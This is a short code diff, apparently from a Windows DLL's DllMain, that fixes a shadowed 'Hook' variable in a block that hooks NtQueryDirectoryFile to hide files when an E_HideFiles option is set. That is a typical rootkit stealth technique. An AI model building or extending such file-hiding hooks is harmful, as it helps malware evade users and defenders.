@@ -260,7 +260,7 @@ BOOL APIENTRY DLLMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpreserv
     }
 
     if (E_HideFiles){
-        bool Hook = CloudHook("NtQueryDirectoryFile", (NTSTATUS)HOOKED_NtQueryDirectoryFile);
+        Hook = CloudHook("NtQueryDirectoryFile", (NTSTATUS)HOOKED_NtQueryDirectoryFile);
     }
 
     if (!Hook){
